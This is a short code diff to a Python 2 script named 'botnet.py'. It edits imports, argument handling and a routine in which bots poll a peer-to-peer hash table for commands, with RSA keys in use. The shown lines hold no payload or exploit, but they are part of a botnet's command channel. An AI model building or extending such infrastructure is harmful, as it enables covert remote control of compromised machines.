@@ -1,6 +1,6 @@
 import hashlib
 import sys
-from twisted.internet import reactor
+from twisted.internet import reactor, task, defer
 from twisted.python import log
 #import kademlia
 import time
@@ -11,13 +11,14 @@ from collections import Counter
 import Crypto
 from Crypto.PublicKey import RSA
 from Crypto import Random
-from twisted.internet.defer import inlineCallbacks, returnValue
+#from twisted.internet.defer import inlineCallbacks, returnValue
 
 
 log.startLogging(sys.stdout)
 
 if len(sys.argv) != 4:
 	print "Usage: python botnet.py <bootstrap ip> <bootstrap port> <bot port>"
+	exit(0)
 bootstrap_ip = str(sys.argv[1])
 port = int(sys.argv[2])
 myport = int(sys.argv[3])
@@ -56,7 +57,7 @@ def wait_cmd(cmd,server,bot):
 	if not cmd:
 		server.get(bot.cmdkey).addCallback(wait_cmd,server,bot)
 	print "we have a command"
-	reactor.stop()
+	#reactor.stop()
 
 def ack_valid(value,server,bot):
 	#t = hashlib.sha1().update('ack')
